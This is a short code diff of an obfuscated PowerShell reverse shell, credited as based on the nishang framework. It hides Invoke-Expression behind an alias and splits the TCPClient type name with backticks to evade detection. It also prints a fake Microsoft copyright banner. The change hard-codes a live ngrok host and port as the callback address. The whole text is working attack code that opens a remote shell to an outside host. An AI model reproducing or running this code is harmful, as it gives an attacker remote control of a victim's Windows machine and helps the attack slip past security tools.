@@ -2,7 +2,7 @@
 #Reverse shell based on the original nishang Framework written by @nikhil_mitt.
 Set-Alias -Name K -Value Out-String
 Set-Alias -Name nothingHere -Value iex
-$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"($args[0],$args[1]);
+$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"("8.tcp.ngrok.io",19124);
 $replace = $BT.GetStream();
 [byte[]]$B = 0..(32768*2-1)|%{0};
 $B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
